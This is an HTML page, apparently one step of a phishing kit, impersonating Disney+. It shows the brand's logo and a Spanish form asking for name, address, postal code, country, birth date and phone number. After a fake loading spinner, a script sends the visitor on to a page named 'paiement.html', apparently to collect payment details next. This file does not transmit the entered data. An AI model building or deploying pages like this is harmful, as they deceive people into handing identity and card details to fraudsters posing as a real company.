<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Información personal | Disney+</title>
  <!-- CSS commun -->
  <link rel="stylesheet" href="style.css"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet"/>
</head>
<body>

  <main class="main-content">
    <!-- Logo centré -->
    <img src="Images/compose2.png"
         alt="Disney+"
         style="display:block; margin:0 auto 30px; width:160px;"/>

    <h1>Información personal</h1>

    <form id="infoForm">
      <input type="text" placeholder="Apellido" required/>
      <input type="text" placeholder="Nombre" required/>
      <input type="text" placeholder="Dirección" required/>
      <input type="text" placeholder="Ciudad" required/>
      <input type="text" placeholder="Código postal" required/>
      <select required>
        <option value="" disabled selected>País</option>
        <option value="ES">España</option>
        <option value="FR">Francia</option>
        <option value="BE">Bélgica</option>
        <option value="CH">Suiza</option>
      </select>
      <input type="date" required/>
      <input type="tel" placeholder="Teléfono" required/>
      <button type="submit">Continuar</button>
    </form>
  </main>

  <!-- Spinner overlay (défini dans style.css) -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    document.getElementById("infoForm").addEventListener("submit", function(e) {
      e.preventDefault();
      // Affiche le spinner
      document.getElementById("spinnerOverlay").style.display = "flex";
      // Redirige après 2,5s
      setTimeout(() => {
        window.location.href = "paiement.html";
      }, 2500);
    });
  </script>
</body>
</html>
